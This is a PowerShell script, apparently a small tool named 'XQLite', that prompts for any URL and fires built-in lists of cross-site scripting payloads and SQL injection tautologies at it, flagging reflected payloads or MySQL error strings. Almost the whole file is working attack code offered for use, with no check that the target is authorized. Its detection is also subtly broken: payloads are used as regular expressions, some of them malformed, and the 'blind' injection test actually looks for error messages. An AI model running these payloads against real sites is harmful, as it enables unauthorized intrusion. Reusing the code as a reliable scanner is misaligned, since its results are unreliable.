function Introduction() {
    Write-Host "`n" `
    "████████╗░█████╗░░█████╗░██████╗░███████╗██████╗░░██████╗░░█████╗░██╗░░░░░███████╗" -ForegroundColor Cyan
    Write-Host "`n" `
    "╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔════╝░██╔══██╗██║░░░░░██╔════╝" -ForegroundColor Yellow
    Write-Host "`n" `
    "░░░██║░░░██║░░██║███████║██████╔╝█████╗░░██████╔╝██║░░██╗░███████║██║░░░░░█████╗░░" -ForegroundColor Green
    Write-Host "`n" `
    "░░░██║░░░██║░░██║██╔══██║██╔══██╗██╔══╝░░██╔══██╗██║░░╚██╗██╔══██║██║░░░░░██╔══╝░░" -ForegroundColor Blue
    Write-Host "`n" `
    "░░░██║░░░╚█████╔╝██║░░██║██║░░██║███████╗██║░░██║╚██████╔╝██║░░██║███████╗███████╗" -ForegroundColor Magenta
    Write-Host "`n" `
    "░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝" -ForegroundColor Red
    Write-Host "`n`n" -ForegroundColor White
    Write-Host "Welcome to the XQLite!" -ForegroundColor Cyan
    Write-Host "This tool allows you to test a website for Cross-Site Scripting (XSS) and Blind SQL Injection vulnerabilities." -ForegroundColor Yellow
    Write-Host "To use this tool, simply provide the URL of the website you want to test." -ForegroundColor Green
    Write-Host "The tool will then send various payloads to the website to check for vulnerabilities." -ForegroundColor Blue
    Write-Host "--------------------------------------------------------------------------------------------------------------" -ForegroundColor Magenta
}

function TestXSS {
    $url = Read-Host "Enter the URL to test for Cross-Site Scripting (XSS) vulnerabilities:"
    $payloads = @(
        "<script>alert('XSS1');</script>",
        "<img src='x' onerror='alert(\'XSS2\')'>",
        "<svg onload='alert(\'XSS3\')'></svg>",
        "<iframe src='javascript:alert(\'XSS4\')'></iframe>",
        "<input type='text' autofocus onfocus='alert(\'XSS5\')'>",
        "<a href='javascript:alert(\'XSS6\')'>Click me</a>",
        "<img src='x' onmouseover='alert(\'XSS7\')'>",
        "<img src='x' onmouseenter='alert(\'XSS8\')'>",
        "<img src='x' onmouseleave='alert(\'XSS9\')'>",
        "<img src='x' onmouseout='alert(\'XSS10\')'>"
    )

    Write-Host "Testing for Cross-Site Scripting (XSS) vulnerabilities on '$url'..."
    $vulnerable = $false
    foreach ($payload in $payloads) {
        try {
            $response = Invoke-WebRequest -Uri ($url + $payload)
            if ($response.Content -match $payload) {
                Write-Host "Payload '$payload' detected. The website may be vulnerable to Cross-Site Scripting (XSS) attack."
                $vulnerable = $true
            }
        } catch {
            Write-Host "Failed to test payload '$payload'."
        }
    }
    if (!$vulnerable) {
        Write-Host "The website '$url' does not appear to be vulnerable to Cross-Site Scripting (XSS) attack."
    }
}

function TestBlindSQLInjection {
    $url = Read-Host "Enter the URL to test for Blind SQL Injection vulnerabilities:"
    $payloads = @(
        "' OR '1'='1",
        "' OR '1'='2",
        "\' OR \'1\'=\'1",
        "\' OR \'1\'=\'2",
        "') OR ('1'='1",
        "') OR ('1'='2",
        "\') OR (\'1\'=\'1",
        "\') OR (\'1\'=\'2",
        "' OR 'a'='a",
        "' OR 'a'='b"
    )

    Write-Host "Testing for Blind SQL Injection vulnerabilities on '$url'..."
    $vulnerable = $false
    foreach ($payload in $payloads) {
        try {
            $injectionUrl = $url + "?id=" + $payload
            $response = Invoke-WebRequest -Uri $injectionUrl
            if ($response.Content -match "Error in SQL syntax|Warning: mysql_fetch_array()") {
                Write-Host "Payload '$payload' detected. The website may be vulnerable to Blind SQL Injection attack."
                $vulnerable = $true
            }
        } catch {
            Write-Host "Failed to test payload '$payload'."
        }
    }
    if (!$vulnerable) {
        Write-Host "The website '$url' does not appear to be vulnerable to Blind SQL Injection attack."
    }
}
